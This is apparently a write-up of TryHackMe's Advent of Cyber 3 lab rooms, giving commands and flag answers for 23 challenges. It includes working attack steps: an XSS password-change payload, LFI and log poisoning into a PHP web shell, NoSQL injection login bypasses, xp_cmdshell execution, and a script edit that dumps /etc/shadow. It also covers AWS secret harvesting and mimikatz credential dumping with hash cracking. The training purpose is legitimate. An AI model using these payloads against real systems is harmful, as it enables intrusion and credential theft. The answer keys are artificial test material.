# Advent of Cyber 3 - Easy

1. [Save The Gifts](#save-the-gifts)
2. [Elf HR Problems](#elf-hr-problems)
3. [Christmas Blackout](#christmas-blackout)
4. [Santa's Running Behind](#santas-running-behind)
5. [Pesky Elf Forum](#pesky-elf-forum)
6. [Patch Management Is Hard](#patch-management-is-hard)
7. [Migration Without Security](#migration-without-security)
8. [Santa's Bag of Toys](#santas-bag-of-toys)
9. [Where Is All This Data Going](#where-is-all-this-data-going)
10. [Offensive Is The Best Defence](#offensive-is-the-best-defence)
11. [Where Are The Reindeers?](#where-are-the-reindeers)
12. [Sharing Without Caring](#sharing-without-caring)
13. [They Lost The Plan!](#they-lost-the-plan)
14. [Dev(Insecure)Ops](#devinsecureops)
15. [Ransomware Madness](#ransomware-madness)
16. [Elf Leaks](#elf-leaks)
17. [Playing With Containers](#playing-with-containers)
18. [Something Phishy Is Going On](#something-phishy-is-going-on)
19. [What's the Worst That Could Happen?](#whats-the-worst-that-could-happen)
20. [Needles In Computer Stacks](#needles-in-computer-stacks)
21. [How It Happened](#how-it-happened)
22. [PowershELlF Magic](#powershellf-magic)
23. [Learning From The Grinch](#learning-from-the-grinch)

## Save The Gifts

```markdown
This challenge is about IDOR (Insecure Direct Object Reference) vulnerabilities.

IDOR vulnerabilities rely on changing user-supplied data, from query components, post variables or cookies.

Now, in the given website, we have four pages, out of which 'Your Activity' contains user input that can be modified.

We change the user_id value and try to find the odd user out.

When user_id=9, we get the Grinch's account.

After reverting the actions, we get the flag.
```

```markdown
1. After finding Santa's account, what is their position in the company? - The Boss!

2. After finding McStocker's account, what is their position in the company? - Build Manager

3. After finding the account responsible for tampering, what is their position in the company? - Mischief Manager

4. What is the received flag when McSkidy fixes the Inventory Management System? - THM{AOC_IDOR_2B34BHI3}
```

## Elf HR Problems

```markdown
In this challenge, we learn about cookies and how to manipulate them.

In the given website, we create an account and attempt to register.

We are not able to bypass the login portal, however a cookie is created.

The value of the cookie is encoded in 'From Hex', decoded using CyberChef tool.

Now, in order to manipulate the cookie, we modify the decoded cookie such that the JSON data now includes 'admin'.

Then, we encode it to hexadecimal again, so that we can use it in Developer Tools.

This allows us to bypass login.
```

```markdown
1. What is the name of the new cookie that was created for your account? - user-auth

2. What encoding type was used for the cookie value? - hexadecimal

3. What object format is the data of the cookie stored in? - JSON

4. What is the value of the administrator cookie? - 7b636f6d70616e793a2022546865204265737420466573746976616c20436f6d70616e79222c206973726567697374657265643a2254727565222c20757365726e616d653a2261646d696e227d

5. What team environment is not responding? - HR

6. What team environment has a network warning? - Application
```

## Christmas Blackout

```markdown
This challenge highlights the topic of content discovery.

We can use ffuf to scan the website

Command: ffuf -u http://10.10.30.30/FUZZ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -s

We get some folders; one of them contains a login panel.

We can use default creds administrator:administrator to login, which gives us the flag.
```

```markdown
1. What is the name of the folder? - admin

2. What is the password? - administrator

3. What is the value of the flag? - THM{ADM1N_AC3SS}
```

## Santa's Running Behind

```markdown
This challenge is about fuzzing login forms.

Referring the given walkthrough, we can make use of Burp Suite to fuzz the login form.

While fuzzing in Intruder, we have to fuzz only the password field, as we know the username is "santa".

After fuzzing, we get the password which can be used for login to get flag.
```

```markdown
1. What valid password can you use to access the "santa" account? - cookie

2. What is the flag in Santa's itinerary? - THM{SANTA_DELIVERS}
```

## Pesky Elf Forum

```markdown
This challenge is about XSS vulnerabilities.

They can be of four types - DOM, Reflected, Stored and Blind.

Now, we login to the given forum link using the creds McSkidy:password.

We change our password to 'pass123', which modifies the URL.

Now, we have to add a comment, exploiting the XSS vulnerability.

Payload: <script>fetch('/settings?new_password=pass123');</script>

We have to logout and login using the Grinch's creds Grinch:pass123

On disabling the plugin, we get the flag.
```

```markdown
1. What flag did you get when you disabled the plugin? - THM{NO_MORE_BUTTMAS}
```

## Patch Management Is Hard

```markdown
This challenge is about LFI vulnerabilities.

We visit the website at <http://10.10.59.80.p.thmlabs.com>

To find an entrypoint, we can use this link and also check the site at <http://10.10.59.80>

We can see in the URL that we have the 'err' parameter; this would be our entrypoint for LFI.

Current URL: <http://10.10.59.80/index.php?err=error.txt>

Modified URL: <http://10.10.59.80/index.php?err=/etc/passwd>

As we have to read /etc/flag, we have to include that in URL.

Modifed URL: <http://10.10.59.80/index/php?err=/etc/flag>

Now, we need to use the PHP filter technique to read the index.php file

Required URL: <http://10.10.59.80/index.php?err=php://filter/convert.base64-encode/resource=/var/www/html/index.php>

The output can be copied and decoded from base64 to get the flag value.

To read the credentials file, we can replace the path of index.php by the credentials file path.

Required URL: <http://10.10.59.80/index.php?err=php://filter/convert.base64-encode/resource=/var/www/html/includes/creds.php>

We can use these creds to login and get the flag in the 'Password Recovery' section.

Now, we have to use LFI to gain RCE via log file page.

Log file page: <http://10.10.59.80/logs.php>

Log file location: ./includes/logs/app_access.log

To get RCE, we need to include PHP code into User-Agent part in the log file.

Command: curl -A "<?php phpinfo();?>" http://10-10-59-80.p.thmlabs.com/index.php

We have to visit log file using LFI.

Required URL: <http://10.10.59.80/index.php?err=php://filter/convert.base64-encode/resource=./includes/logs/app_access.log>

We will have to use this through a private window to avoid the current login session.

This gives us the log file info, so we can now continue with actually doing the RCE bit; we can use log poisoning.

Command: curl -A "<?php system(\$_GET['cmd']);?>" http://10-10-59-80.p.thmlabs.com/index.php

Required URL: <http://10.10.59.80/index.php?err=../../../../var/www/html/includes/logs/app_access.log>

We need to get hostname of web server.

Required URL: <http://10.10.59.80/index.php?err=../../../../var/www/html/includes/logs/app_access.log&cmd=hostname>
```

```markdown
1. What is the entry point for our web application? - err

2. Use the entry point to perform LFI to read the /etc/flag file. What is the flag? - THM{d29e08941cf7fe41df55f1a7da6c4c06}

3. Use the PHP filter technique to read the source code of the index.php. What is the $flag variable's value? - THM{791d43d46018a0d89361dbf60d5d9eb8}

4. What are the username and password? - McSkidy:A0C315Aw3s0m

5. What is the password of the flag.thm.aoc server? - THM{552f313b52e3c3dbf5257d8c6db7f6f1}

6. What is the hostname of the webserver? - lfi-aoc-awesome-59aedca683fff9261263bb084880c965
```

## Migration Without Security

```shell
ssh thm@10.10.128.156 -p 2222

mongo
#connect and interact with mongodb

show databases

use flagdb

db.getCollectionNames();

db.flagColl.find()
#gives flag
```

```markdown
We visit the link given and attempt to search for an user.

We can intercept the login request using Burp and modify the POST parameter.

Original: username=joe&password=mama

Modified: username=admin&password[$ne]=mama

After bypassing login, we can retrieve the flag.

Now, for searching the guest roles, we have to modify the parameter again.

Original: GET /search?username=guest&role=user

Modified: GET /search?username[$ne]=guest&role=guest

This gives us the flag.

For the final part, we have to get mcskidy record, for which we have to modify the parameter again.

Modified: GET /search?username=mcskidy&role[$ne]=user
```

```markdown
1. Interact with the MongoDB server to find the flag. What is the flag? - THM{8814a5e6662a9763f7df23ee59d944f9}

2. Log into the application that Grinch Enterprise controls as admin and retrieve the flag? - THM{b6b304f5d5834a4d089b570840b467a8}

3. Use the gift search page to list all usernames that have guest roles. What is the flag? - THM{2ec099f2d602cc4968c5267970be1326}

4. What is the details record? - 
ID:6184f516ef6da50433f100f4:mcskidy:admin
```

## Santa's Bag of Toys

```markdown
First, we remotely connect to the system.

Command: xfreerdp /u:Administrator /p:grinch123! /v:10.10.52.155

We have to view the PowerShell Transcription Logs, in the folder SantasLaptopLogs.

From the 5 log files given to us, we can find the answers.

Now, we have to decode from base64 the UsrClass.dat file contents, which can be copied from the logs, and decoded in CyberChef.

After downloading the decoded file, we have to use it in ShellBagsExplorer now.

File > Load offline hive > decoded.dat

Now we can go through the discovered Shellbags.

The directories give us some clues regarding the contents of the folders.

From these clues, we can search on Github for the required repository.

We can get the password for the UHA file from the previous GitHub commits.

This password can be used to unlock the UHA file.
```

```markdown
1. What operating system is Santa's laptop running? - Microsoft Windows 11 Pro

2. What was the password set for the new "backdoor" account? - grinchstolechristmas

3. What is the full path of the original file? - C:\Users\santa\AppData\Local\Microsoft\Windows\UsrClass.dat

4. What is the name of this LOLbin? - certutil.exe

5. What specific folder name clues us in that this might be publicly accessible software hosted on a code-sharing platform? - .github

6. What is the name of the file found in this folder? - bag_of_toys.zip

7. What is the name of the user that owns the SantaRat repository? - Grinchiest

8. What is the name of the repository that seems especially pertinent to our investigation? - operation-bag-of-toys

9. What is the name of the executable that installed a unique utility the actor used to collect the bag of toys? - uharc-cmd-install.exe

10. What are the contents of these "malicious" files? - GRINCHMAS

11. What is the password to the original bag_of_toys.uha archive? - TheGrinchiestGrinchmasOfAll

12. How many original files were present in Santa's Bag of Toys? - 228
```

## Where Is All This Data Going

```markdown
We have to use Wireshark to analyze the given packet files. We can use filters to search.

Required filters:

    http.request.method == GET

    http.request.method == POST

    dns

    ftp

    ftp-data
```

```markdown
1. In the HTTP #1 - GET requests section, which directory is found on the web server? - login

2. What is the username and password used in the login page in the HTTP #2 - POST section? - McSkidy:Christmas2021!

3. What is the User-Agent's name that has been sent in HTTP #2 - POST section? - TryHackMe-UserAgent-THM{d8ab1be969825f2c5c937aec23d55bc9}

4. In the DNS section, there is a TXT DNS query. What is the flag in the message of that DNS query? - THM{dd63a80bf9fdd21aabbf70af7438c257}

5. In the FTP section, what is the FTP login password? - TryH@ckM3!

6. In the FTP section, what is the FTP command used to upload the secret.txt file? - STOR

7. In the FTP section, what is the content of the secret.txt file? - 123^-^321
```

## Offensive Is The Best Defence

```shell
nmap -sT 10.10.254.185
#tcp connect scan

sudo nmap -sS 10.10.254.185
#tcp syn scan

nmap -sV 10.10.254.185

sudo nmap -sS -p- 10.10.254.185

nmap -sV -p 20212 10.10.254.185
```

```markdown
1. How many ports are open between 1 and 100? - 2

2. What is the smallest port number that is open? - 22

3. What is the service related to the highest port number? - http

4. Now run nmap -sS MACHINE_IP. Did you get the same results? - Y

5. What is the version number of the web server? - Apache httpd 2.4.49

6. What is the CVE number of the vulnerability that was solved in version 2.4.51? - CVE-2021-42013

7. What is the port number that appeared in the results now? - 20212

8. What is the name of the program listening on the newly discovered port? - telnetd
```

## Where Are The Reindeers?

```shell
nmap -T4 -p 1-9999 -Pn 10.10.174.199

sqsh -S 10.10.174.199 -U sa -P t7uLKzddQzVjVFJp
#sqsh is interactive database shell
#to communicate with MS SQL server

SELECT * FROM reindeer.dbo.names;
go
#SQL query to dump contents
#go sends SQL batch to database
#here reindeer is name of database and names is a table

SELECT * FROM reindeer.dbo.schedule;
go

SELECT * FROM reindeer.dbo.presents;
go

xp_cmdshell 'whoami';
go
#to run MS Windows commands while interacting with server

xp_cmdshell 'dir C:\Users\grinch *.txt /s';
go
#to find flag

xp_cmdshell 'type C:\Users\grinch\Documents\flag.txt';
go
```

```markdown
1. There is an open port related to MS SQL Server accessible over the network. What is the port number? - 1433

2. What is the prompt that you have received? - 1>

3. What is the first name of the reindeer of id 9? - Rudolph

4. What is the destination of the trip scheduled on December 7? - Prague

5. What is the quantity available for the present "Power Bank"? - 25000

6. There is a flag hidden in the grinch user's home directory. What are its contents? - THM{YjtKeUy2qT3v5dDH}
```

## Sharing Without Caring

```shell
nmap -T4 -Pn -A 10.10.171.20
#as Windows hosts block pings by default

showmount -e 10.10.171.20
#show shares

mkdir tmp1

sudo mount 10.10.171.20:/share tmp1
#mount the shares

cd tmp1

ls

less 2680-0.txt

cd ..

mkdir tmp2

sudo mount 10.10.171.20:/confidential tmp2

cd tmp2

ls

cd ssh

ls

md5sum id_rsa
```

```markdown
1. How many TCP ports are open? - 7

2. Which port is detected by Nmap as NFS or using the mountd service? - 2049

3. How many shares did you find? - 4

4. How many shares show "everyone"? - 3

5. What is the title of file 2680-0.txt? - Meditations

6. What is the name of the share? - confidential

7. What is the MD5 sum of id_rsa? - 3e2d315a38f377f304f5598dc2f044de
```

## They Lost The Plan

```shell
xfreerdp /u:mcskidy /p:Password1 /v:10.10.7.177

net users

systeminfo

wmic service list
```

```markdown
We have to follow the given exploitation steps for Iperius Backup Service.

Once we have configured everything, start a listener on attacking machine and wait for incoming connection.
```

```shell
whoami

cd ..

cd ..

dir flag.txt /s

cd Users

cd thegrinch

dir

cd Documents

dir

type flag.txt

type Schedule.txt
```

```markdown
1. Complete the username? - pepper

2. What is the OS version? - 10.0.17763 N/A Build 17763

3. What backup service did you find running on the system? - IperiusSvc

4. What is the path of the executable for the backup service you have identified? - C:\Program Files (x86)\Iperius Backup\IperiusService.exe

5. What user do you have? - the-grinch-hack\thegrinch

6. What is the content of the flag.txt file? - THM-736635221

7. Where can we find him at 5:30? - jazzercize
```

## Dev(Insecure)Ops

```markdown
This room is about CI/CD process and the risks associated with it.

We visit <http://10.10.100.183/>; we can scan it for further info.

After the ffuf scan, we get two directories - warez and admin.

Checking <http://10.10.100.183/admin> and its source code gives us more info.

Now, we can ssh into the machine using given creds.

We have to navigate to the scripts folder and check the scripts to understand the workflow.

We can see that loot.sh can be edited by us.

Following the walkthrough, we edit the scripts accordingly.
```

```shell
ffuf -u http://10.10.100.183/FUZZ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -s

ssh mcskidy@10.10.100.183
#ssh using given creds

cd /home/thegrinch/scripts

ls -la
#check the scripts

cat loot.sh

nano loot.sh
#edit to print /etc/shadow
#cat /etc/shadow > /var/www/html/ls.html

nano loot.sh
#edit to print check.sh
#cat /home/thegrinch/scripts/check.sh > /var/www/html/ls.html

nano loot.sh
#edit to print flag
#cat /home/thegrinch/Desktop/flag.txt > /var/www/html/ls.html
```

```markdown
1. How many pages did the dirb scan find with its default wordlist? - 4

2. How many scripts do you see in the /home/thegrinch/scripts folder? - 4

3. What are the five characters following $6$G in pepper's password hash? - ZUP42

4. What is the content of the flag.txt file on the Grinch's user's desktop? - DI3H4rdIsTheBestX-masMovie!
```

## Ransomware Madness

```markdown
We have been given the ransomware note in Russian, which on translation gives:

!!! IMPORTANT !!!

Your files have been encrypted by the Grinch. We use the latest encryption technology.

To access your files, please contact your Grinch Enterprises operator.

Your personal identification identifier: "b288b97e-665d-4105-a3b2-666da90db14b".

The operator assigned to your case can be contacted as "GrinchWho31" on all platforms.

!!! IMPORTANT !!!
```

```markdown
From the translation, we get a lot of clues.

We can Google "GrinchWho31" to get the associated platforms.

We can find the clues on three platforms - Twitter, Keybase and GitHub
```

```markdown
1. What is the operator's username? - GrinchWho31

2. What social media platform is the username associated with? - Twitter

3. What is the cryptographic identifier associated with the operator? - 1GW8QR7CWW3cpvVPGMCF5tZz4j96ncEgrVaR

4. What platform is the cryptographic identifier associated with? - Keybase.io

5. What is the bitcoin address of the operator? - bc1q5q2w2x6yka5gchr89988p2c8w8nquem6tndw2f

6. What platform does the operator leak the bitcoin address on? - GitHub

7. What is the operator's personal email? - DonteHeath21@gmail.com

8. What is the operator's real name? - Donte Heath
```

## Elf Leaks

```markdown
Here, we use the AWS CLI to access the AWS account and resources.

Given, the flyer image is linked from an external S3 bucket.

After listing the contents of the bucket, we can check it.

Following the rest of the walkthrough, we can answer the questions.
```

```shell
aws s3 ls s3://images.bestfestivalcompany.com/ --no-sign-request
#list contents of s3 bucket

aws s3 cp s3://images.bestfestivalcompany.com/flag.txt . --no-sign-request
#to get flag.txt object from the s3 bucket

cat flag.txt

aws s3 cp s3://images.bestfestivalcompany.com/wp-backup.zip . --no-sign-request

unzip wp-backup.zip

cd wp_backup

ls

grep -nr "AKIA"
#search for AWS Access Key ID

less wp-config.php
#note the details related to the S3 bucket

aws configure --profile aocthm
#enter the details noted above here
#to configure profile

aws sts get-access-key-info --access-key-id AKIAQI52OJVCPZXFYAOI --profile aocthm
#gives us the AWS account ID

aws sts get-caller-identity --profile aocthm
#gives user ID and ARN

aws ec2 describe-instances --output text --profile aocthm
#list EC2 instances

aws secretsmanager help
#view commands

aws secretsmanager list-secrets --profile aocthm
#lists all secrets

aws secretsmanager get-secret-value --secret-id HR-Password --profile aocthm
#we do not get secret string here
#hint shows that we have to specify north region

aws secretsmanager get-secret-value --secret-id HR-Password --profile aocthm --region us-north-1
#this does not work
#we can try other regions

aws secretsmanager get-secret-value --secret-id HR-Password --profile aocthm --region eu-north-1
#gives us the DB password
```

```markdown
1. What is the name of the S3 Bucket used to host the HR Website announcement? - images.bestfestivalcompany.com

2. What is the message left in the flag.txt object from that bucket? - It's easy to get your elves data when you leave it so easy to find!

3. What other file in that bucket looks interesting to you? - wp-backup.zip

4. What is the AWS Access Key ID in that file? - AKIAQI52OJVCPZXFYAOI

5. What is the AWS Account ID that access-key works for? - 019181489476

6. What is the Username for that access-key? - ElfMcHR@bfc.com

7. Under the TAGs, what is the Name of the instance? - HR-Portal

8. What is the database password stored in Secrets Manager? - Winter2021!
```

## Playing With Containers

```markdown
Given, we have a public Elastic Container Registry at <https://gallery.ecr.aws/h0w1j9u3/grinch-aoc>

We can pull the image and run it locally to check.

We can also check the container image and its files.
```

```shell
docker images
#list container images stored

docker pull public.ecr.aws/h0w1j9u3/grinch-aoc:latest
#retrieve container image

docker run -it public.ecr.aws/h0w1j9u3/grinch-aoc:latest
#run container and interact with it
#-it opens shell inside container image

ls -la

printenv
#environment configurations
#this gives us an api key

exit
#exit container shell

mkdir aoc

cd aoc

docker save -o aoc.tar public.ecr.aws/h0w1j9u3/grinch-aoc:latest
#save container image as a tar file

tar -xvf aoc.tar
#decompress file

cat manifest.json | jq
#print file using jq (pretty-print)
#includes Config, RepoTags and Layers

cat f886f00520700e2ddd74a14856fcc07a36c819b4cea8cee8be83d4de01e9787.json | jq
#print Config file

cd 4416e55edf1a706527e19102949972f4a8d89bbe2a45f917565ee9f3b08b7682

ls

tar -xvf layer.tar

cat root/envconsul/config.hcl | grep "token"
#prints token value
```

```markdown
1. What command will list container images stored in your local container registry? - docker images

2. What command will allow you to save a docker image as a tar archive? - docker save

3. What is the name of the file for the configuration, repository tags, and layer hash values stored in a container image? - manifest.json

4. What is the token value you found for the bonus challenge? - 7095b3e9300542edadbc2dd558ac11fa
```

## Something Phishy Is Going On

```markdown
On opening the mail application, we can view the Email.eml file.

We have to inspect its contents by viewing its source code.

The source code contains a lot of clues for getting the flag.

After checking the source code, we can open the terminal, to view the email artifacts.

The email artifacts can be viewed normally as well.
```

```shell
ls

cd Desktop

ls

cd Email\ Artifacts/

ls
#shows the required files

cat attachment-base64-only.txt | base64 -d > file.pdf
#convert base64 string to original file format
```

```markdown
1. Who was the email sent to? - elfmcphearson@tbfc.com

2. Who does it say the email was from? - customerservice@t8fc.info

3. If this email was replied to, what email address will receive the email response? - fisher@tempmailz.grinch

4. What is the misspelled word? - stright

5. What is the link to the credential harvesting website? - https://89xgwsnmo5.grinch/out/fishing/

6. What is the header and its value? - X-GrinchPhish: >;^)

7. What is the name of the attachment? - password-reset-instructions.pdf

8. What is the flag in the PDF file? - THM{A0C_Thr33_Ph1sh1ng_An4lys!s}
```

## What's the Worst That Could Happen?

```shell
cd Desktop

ls

ls Samples/

file Samples/exmatter

file Samples/bizarro

file testfile

strings testfile

strings Samples/exmatter > strings_output.txt
#this contains some clues

md5sum testfile
#hash for required file
```

```markdown
Now, after calculating the file hash, we can submit it to VirusTotal.

We can go through the results to answer the questions.

Furthermore, we can visit <https://www.eicar.org/download-anti-malware-testfile/> to get more info about the file used.
```

```markdown
1. What is the output? - X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*

2. What is the file type? - EICAR virus test files

3. When was the file first seen in the wild? - 2005-10-17 22:03:48 UTC

4. What is the classification assigned to the file by Microsoft? - Virus:DOS/EICAR_Test_File

5. What were the first two names of this file? - ducklin.htm or ducklin-html.htm

6. What is the maximum number of total characters that can be in the file? - 128
```

## Needles In Computer Stacks

```markdown
This challenge is about YARA, a multi-platform tool for matching patterns of interest in malicious files.

We have to use the text editor and write demo rules for detecting few strings found in the EICAR testfile.
```

```markdown
rule eicaryara   {
    meta:
      author="tryhackme"
      description="eicar string"
    strings:
      $a="X5O"
      $b="EICAR"
      $c="ANTIVIRUS"
      $d="TEST"
    condition:
      $a and $b and $c and $d
  }
```

```shell
cd Desktop

ls

yara eicaryara testfile
#here eicaryara is the rulefile
#testfile is the file to be tested
#rule is not hit

yara -m eicaryara testfile
#prints metadata if hit

yara -s eicaryara testfile
#print strings that matched file

yara --help

yara -c eicaryara testfile
#print count of matched strings
```

```markdown
1. What boolean operator shall we replace the 'and' with, in order for the rule to still hit the file? - or

2. What option is used in the Yara command in order to list down the metadata of the rules that are a hit to a file? - -m

3. What section contains information about the author of the Yara rule? - metadata

4. What option is used to print only rules that did not hit? - -n

5. What is the result? - 0
```

## How It Happened

```shell
oledump.py -s 8 -d C:\Users\Administrator\Desktop\Santa_Claus_Naughty_List_2021\Santa_Claus_Naughty_List_2021.doc
#dumps obfuscated, encoded string

oledump.py C:\Users\Administrator\Desktop\Santa_Claus_Naughty_List_2021\Santa_Claus_Naughty_List_2021.doc
#to find number of streams
#check each stream for flag

oledump.py -s 7 -d C:\Users\Administrator\Desktop\Santa_Claus_Naughty_List_2021\Santa_Claus_Naughty_List_2021.doc
#gives first flag
```

```markdown
The obfuscated string from oledump can be copied in CyberChef.

The recipe to decode it is Base64, XOR-35 (decimal), and Base64 again.

This gives us the details regarding Grinch Enterprises.

After that, we have to find the flag hidden in one of the streams of the document.

We can do that using oledump.

For second flag, we have to check files in the machine.

There is a PNG file in the Pictures folder named flag2. On opening that file, we get the flag.
```

```markdown
1. What is the username from the decoded script? - Grinch.Enterprises.2021@gmail.com

2. What is the mailbox password you found? - S@ntai$comingt0t0wn

3. What is the subject of the email? - Christmas Wishlist

4. What port is the script using to exfiltrate data from the North Pole? - 587

5. What is the flag hidden found in the document that Grinch Enterprises left behind? - YouFoundGrinchCookie

6. There is still a second flag somewhere... can you find it on the machine? - S@nt@c1Au$IsrEAl
```

## PowershELlF Magic

```markdown
For this challenge, we have to use PowerShell Logging.

We have to use a tool called Full Event Log View to view Event IDs 4103 and 4104.

After applying the filters provided to us, we can click on the event logs for more details.

The logs mention CVE-2021-1675; we can look into that.

Furthermore, to find the timestamp of the deletion of password.txt, we have to update the filters in Advanced search, to include password.txt as a search string for all events.

To get the contents of the password.txt file, we can use the decryptor.ps1 file on Desktop, and enter the required values.

Upon running that program, we get the contents.
```

```markdown
1. What command was executed as Elf McNealy to add a new user to the machine? - Invoke-Nightmare

2. What user executed the PowerShell file to send the password.txt file from the administrator's desktop to a remote server? - adm1n

3. What was the IP address of the remote server? What was the port used for the remote connection? - 10.10.148.96,4321

4. What was the encryption key used to encrypt the contents of the text file sent to the remote server? - j3pn50vkw21hhurbqmxjlpmo9doiukyb

5. What application was used to delete the password.txt file? - sdelete.exe

6. What is the date and timestamp the logs show that password.txt was deleted? - 11/11/2021 7:29:27 PM

7. What were the contents of the deleted password.txt file? - Mission Control: letitsnowletitsnowletitsnow
```

## Learning from The Grinch

```powershell
#using sekurlsa module in mimikatz tool
cd .\Desktop\mimikatz\x64\

.\mimikatz.exe
#in mimikatz

privilege::debug
#check privilege

sekurlsa::logonpasswords
#dump hashes
#we have to get password hashes of emily

#in our system, we have to use jtr to crack ntlm hash
echo "8af326aa4850225b75c592d4ce19ccf5" > emilyhash.txt

cd src/john/run

./john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt ~/emilyhash.txt
#gives us the password
```

```markdown
1. What is the username of the other user on the system? - emily

2. What is the NTLM hash of this user? - 8af326aa4850225b75c592d4ce19ccf5

3. What is the password for this user? - 1234567890
```
